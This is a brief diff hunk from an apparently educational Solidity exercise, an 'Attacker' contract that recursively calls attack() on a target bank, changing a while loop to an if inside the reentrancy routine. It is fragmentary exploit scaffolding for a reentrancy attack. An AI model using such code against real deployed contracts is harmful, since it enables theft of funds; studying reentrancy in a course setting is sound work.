@@ -69,7 +69,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO RECURSE ATTACK GOES HERE
 		
-		while (depth<=max_depth) {
+		if (depth<=max_depth) {
 			emit Recurse(depth);
       			attack(amount);
 			depth = depth+1;
